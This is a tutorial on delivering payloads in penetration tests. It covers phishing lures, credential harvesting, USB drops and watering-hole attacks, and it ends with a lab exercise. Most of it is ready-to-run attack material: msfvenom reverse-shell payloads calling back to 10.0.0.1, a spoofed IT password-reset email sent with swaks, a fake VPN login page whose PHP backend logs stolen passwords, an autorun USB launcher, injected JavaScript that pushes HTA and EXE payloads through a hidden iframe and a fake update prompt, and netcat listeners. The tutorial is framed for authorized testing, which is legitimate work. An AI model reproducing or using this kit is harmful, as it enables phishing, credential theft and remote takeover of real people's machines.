# Payload Delivery Techniques Guide

> Comprehensive guide to delivering payloads through social engineering, phishing, USB drops, watering holes, and physical access scenarios. Covers the full delivery lifecycle from lure creation through execution verification.

## Introduction

Generating a functional payload is only half the battle -- delivering it to the target system without being intercepted by email gateways, web proxies, endpoint detection, or user awareness requires careful planning and execution. This guide covers the complete delivery lifecycle for penetration testing engagements, from crafting convincing social engineering lures to verifying successful payload execution.

The delivery method must match the target environment, the engagement scope, and the available attack surface. A heavily monitored corporate network requires different delivery approaches than a directly exposed server. Social engineering delivery targets the human element, which is often the weakest link in the security chain.

**Objectives**: Master social engineering delivery techniques, construct phishing payloads with credible lures, build USB drop packages, implement watering hole attacks, and verify successful delivery through monitoring infrastructure.

**Prerequisites**: Understanding of payload generation from msfvenom-payload-generation-guide.md. Familiarity with web delivery from payload-delivery-evasion-guide.md. Engagement scope that explicitly authorizes social engineering testing.

---

## 1. Social Engineering Lure Development

### Lure Credibility Assessment

The effectiveness of any social engineering delivery depends on the credibility of the lure. A lure must be relevant to the target, create urgency or curiosity, and appear to come from a legitimate source.

**Lure research methodology**:

1. Identify the target organization's recent activities (press releases, job postings, product launches)
2. Determine the organizational structure (departments, reporting lines, key personnel)
3. Identify current events relevant to the target (industry conferences, regulatory changes, earnings dates)
4. Map the technology stack (email provider, VPN vendor, cloud services)
5. Select the most convincing lure type based on the research findings

**Common lure categories and templates**:

| Lure Type | Urgency | Complexity | Effectiveness |
|-----------|---------|------------|---------------|
| IT notification (password reset, VPN update) | High | Low | Very High |
| HR document (policy update, benefits enrollment) | Medium | Low | High |
| Financial report (quarterly earnings, budget) | Medium | Medium | High |
| Package delivery notification | High | Low | High |
| Meeting invite with attachment | Low | Low | Medium |
| Software update notification | Medium | Medium | Medium |

### Email Template Construction

```bash
# Build a phishing email from a template
cat > phishing_email.txt << 'EMAIL'
From: IT Support <it-support@target-company.com>
To: employee@target-company.com
Subject: [Action Required] Password Reset - Immediate Attention Needed

Dear Employee,

Our security team has detected unusual activity on your account.
As a precautionary measure, we require you to reset your password
within 24 hours to maintain access to company systems.

Please open the attached document and follow the instructions
to complete the password reset process.

If you did not request this change, please contact the IT Help Desk
immediately at extension 5555.

Best regards,
IT Security Team
Target Company Name
EMAIL

# Generate a matching macro-enabled document
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f vba-psh -o password_reset_macro.txt
```

---

## 2. Phishing Infrastructure Setup

### Email Sending Infrastructure

```bash
# Method 1: Using swaks (Swiss Army Knife for SMTP) for targeted phishing
# Install swaks
sudo apt install swaks

# Send a targeted phishing email with attachment
swaks --to target@company.com \
  --from it-support@company.com \
  --server mail.company.com \
  --header "Subject: Urgent: Password Reset Required" \
  --body "Please open the attached document to reset your password." \
  --attach @password_reset.docm \
  --header "X-Priority: 1" \
  --header "Importance: High"

# Method 2: Using a phishing framework (GoPhish)
# Install and configure GoPhish for campaign management
# GoPhish provides tracking of opens, clicks, and credential submission

# Method 3: Using sendmail for custom phishing
# Configure sendmail with proper SPF/DKIM records
# Ensure the sending domain has proper email authentication configured
```

### Landing Page Construction

```bash
# Create a credential harvesting landing page that mimics the target's VPN portal
cat > vpn_login.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>VPN Portal - Secure Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; }
        .login-box { width: 400px; margin: 100px auto; padding: 30px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
        input[type="submit"] { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Secure Remote Access</h2>
        <form action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign In">
        </form>
    </div>
</body>
</html>
HTMLEOF

# Credential capture backend
cat > capture.php << 'PHPEOF'
<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$log = fopen("creds.txt", "a");
fwrite($log, "$timestamp | $ip | $username | $password | $ua\n");
fclose($log);

// Redirect to the real VPN portal after capture
header("Location: https://vpn.target-company.com/");
exit;
?>
PHPEOF
```

---

## 3. USB Drop Payload Construction

### USB Drop Package Design

USB drops exploit human curiosity by leaving infected USB drives in locations where target employees will find and insert them. The payload must execute automatically or appear as a legitimate file that the user opens.

```bash
# Method 1: Rubber Ducky style payload (HID attack)
# Uses a USB device that emulates a keyboard to type commands
# Requires a USB Rubber Ducky, Bash Bunny, or similar HID device

# Method 2: Standard USB drive with social engineering lure
# Create a USB drive structure:

# Step 1: Format and set volume label
sudo mkfs.vfat -F 32 -n "SALARY_2024" /dev/sdb1

# Step 2: Create the directory structure
mkdir -p /mnt/usb/Confidential
mkdir -p /mnt/usb/Documents

# Step 3: Generate the payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f exe -o /mnt/usb/Confidential/Document_Viewer.exe

# Step 4: Create a shortcut that executes the payload
# (Use PowerShell to create LNK file with custom icon)
# The shortcut appears as "Salary_Review_Q4.pdf" but executes the payload

# Step 5: Add decoy documents for credibility
echo "Q4 2024 Salary Review - Confidential" > /mnt/usb/Documents/README.txt
```

### USB AutoRun for Older Systems

```bash
# Create autorun.inf for systems with autorun enabled
cat > /mnt/usb/autorun.inf << 'EOF'
[autorun]
open=launch.bat
icon=shell32.dll,7
label=Company Documents
action=Open folder to view files

[Content]
MusicFiles=false
PictureFiles=false
VideoFiles=false
EOF

# Create the launcher batch file
cat > /mnt/usb/launch.bat << 'BAT'
@echo off
start "" "%~dp0Confidential\Document_Viewer.exe"
start "" explorer.exe "%~dp0Documents"
BAT
```

---

## 4. Watering Hole Attacks

### Compromised Website Payload Delivery

Watering hole attacks compromise websites that the target organization's employees frequently visit. When employees browse the compromised site, the payload is delivered through drive-by download or browser exploitation.

```bash
# Inject a payload delivery script into a compromised web page
# This script checks the user agent and delivers appropriate payloads

cat > inject.js << 'JSEOF'
(function() {
    // Payload delivery script for compromised website
    var img = new Image();

    // Determine target platform
    var ua = navigator.userAgent;
    var isWindows = ua.indexOf('Windows') !== -1;
    var isMac = ua.indexOf('Mac') !== -1;
    var isLinux = ua.indexOf('Linux') !== -1;

    // Create hidden iframe for payload download
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';

    if (isWindows) {
        // Deliver Windows payload via HTA
        iframe.src = 'http://10.0.0.1:8080/update.hta';
    } else if (isLinux) {
        // Deliver Linux payload
        iframe.src = 'http://10.0.0.1:8080/update.elf';
    }

    document.body.appendChild(iframe);

    // Also deliver via fake update notification
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';
    overlay.innerHTML = '<div style="background:white;padding:40px;border-radius:10px;text-align:center;"><h2>Browser Update Required</h2><p>A critical security update is available.</p><a href="http://10.0.0.1:8080/update.exe" style="padding:10px 20px;background:#007bff;color:white;text-decoration:none;border-radius:5px;">Download Update</a></div>';
    document.body.appendChild(overlay);
})();
JSEOF
```

---

## 5. Delivery Monitoring and Verification

### Tracking Delivery Success

```bash
# Set up comprehensive monitoring for payload delivery
# Listener with logging
cat > listener_with_logging.sh << 'SCRIPT'
#!/bin/bash
LOGFILE="delivery_log_$(date +%Y%m%d_%H%M%S).txt"

echo "[*] Starting listener with logging to $LOGFILE"
echo "[*] Waiting for connections on port 4444..."

while true; do
  echo "[$(date)] Listener ready" >> "$LOGFILE"
  nc -lvnp 4444 2>&1 | tee -a "$LOGFILE"
  echo "[$(date)] Connection closed, restarting..." >> "$LOGFILE"
  sleep 2
done
SCRIPT
chmod +x listener_with_logging.sh

# HTTP server with request logging for delivery tracking
python3 -c "
import http.server
import logging
import sys

class LogHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        logging.info('%s - %s' % (self.client_address[0], format % args))
        sys.stderr.write('%s - [%s] %s\n' % (self.client_address[0], self.log_date_time_string(), format % args))

logging.basicConfig(filename='delivery_requests.log', level=logging.INFO)
http.server.test(HandlerClass=LogHandler, port=8080)
"
```

### Payload Beacon Detection

```bash
# Monitor for payload execution indicators
# Set up multiple listeners for different payload types

# Listener 1: Standard reverse shell
nc -lvnp 4444 >> shell_log.txt 2>&1 &

# Listener 2: HTTP callback (for payloads that phone home)
python3 -m http.server 8080 >> http_log.txt 2>&1 &

# Listener 3: DNS callback
tcpdump -i any -w dns_callback.pcap 'udp port 53 and host 10.0.0.1' &

# Monitor all listeners
tail -f shell_log.txt http_log.txt &
```

---

## Hands-on Exercise: Complete Delivery Campaign

Practice the full delivery lifecycle in a lab environment.

**Setup**: Isolated lab network with a Windows target VM. Email server (or simulated). Payload delivery infrastructure (HTTP server, listener). USB drive for physical delivery testing.

**Exercise steps**:

1. Research the target organization (use a fictional company for the lab) and identify the most effective lure type
2. Construct a phishing email with a credible lure and macro-enabled document
3. Build a credential harvesting landing page that mimics the target's VPN portal
4. Create a USB drop package with a convincing file structure and hidden payload
5. Set up monitoring infrastructure to track delivery success (opens, clicks, executions)
6. Deliver payloads through each channel and verify successful execution
7. Document the complete delivery campaign with screenshots and timeline

**Validation criteria**: Successfully deliver a payload through at least two channels. Verify payload execution on the target VM. Track delivery metrics (open rate, click rate, execution rate). Document findings for the engagement report.

## References

- [MITRE ATT&CK T1566 - Phishing](https://attack.mitre.org/techniques/T1566/)
- [MITRE ATT&CK T1200 - Hardware Additions](https://attack.mitre.org/techniques/T1200/)
- [MITRE ATT&CK T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
- [GoPhish Phishing Framework](https://getgophish.com/)
- [Swaks SMTP Tool](http://www.jetmore.org/john/code/swaks/)
- [HackTricks - Phishing](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology)
- [Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit)
